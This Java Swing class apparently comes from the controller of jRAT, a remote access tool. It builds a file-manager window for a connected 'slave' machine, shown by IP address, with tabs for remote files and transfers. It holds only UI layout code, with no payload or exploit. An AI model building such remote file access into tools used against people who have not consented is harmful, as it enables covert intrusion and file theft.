package se.jrat.controller.ui.frames;

import java.awt.BorderLayout;
import java.awt.Toolkit;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.HashMap;
import java.util.Map;

import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.WindowConstants;

import se.jrat.controller.Slave;
import se.jrat.controller.ui.panels.PanelFileTransfers;
import se.jrat.controller.ui.panels.PanelRemoteFiles;
import se.jrat.controller.ui.panels.PanelRemoteFiles.RemoteFileTable;

@SuppressWarnings("serial")
public class FrameRemoteFiles extends BaseFrame {
	
	public RemoteFileTable remoteTable;
	
	public static final Map<Slave, FrameRemoteFiles> INSTANCES = new HashMap<Slave, FrameRemoteFiles>();

	private Slave slave;

	public FrameRemoteFiles(Slave slave) {
		this.slave = slave;
		INSTANCES.put(slave, this);
		setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);

		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});

		setBounds(100, 100, 760, 500);
		setLayout(new BorderLayout(0, 0));
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteFiles.class.getResource("/icons/folder-tree.png")));

		setTitle("File manager - " + "[" + slave.formatUserString() + "] - " + slave.getIP());

		PanelRemoteFiles remoteFiles = new PanelRemoteFiles(slave);
		remoteTable = remoteFiles.remoteTable;
		
		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setViewportView(PanelFileTransfers.instance);
		
		JTabbedPane tabbedPane = new JTabbedPane();
		tabbedPane.addTab("Files", remoteFiles);
		tabbedPane.addTab("Transfers", scrollPane);
		
		add(tabbedPane, BorderLayout.CENTER);	
	}

	public void exit() {
		INSTANCES.remove(slave);
	}

}
